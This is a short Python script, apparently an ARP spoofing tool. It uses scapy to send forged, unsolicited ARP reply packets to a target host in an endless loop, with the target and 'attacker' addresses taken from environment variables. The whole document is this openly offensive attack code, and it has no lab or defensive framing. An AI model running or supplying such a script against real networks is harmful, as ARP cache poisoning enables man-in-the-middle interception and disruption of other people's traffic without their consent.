from scapy.all import *
from scapy.layers.l2 import ARP
import os
target_ip = os.environ['TARGET_IP']
target_mac = os.environ['TARGET_MAC']

attacker_ip = os.environ['ATTACKER_IP']
attacker_mac = os.environ['ATTACKER_MAC']

while True:
    my_arp_response = ARP()

    my_arp_response.op = 2
    my_arp_response.pdst = target_ip
    my_arp_response.hwdst = target_mac

    my_arp_response.psrc = attacker_ip
    my_arp_response.hwsrc = attacker_mac
    print(my_arp_response.show())
    send(my_arp_response)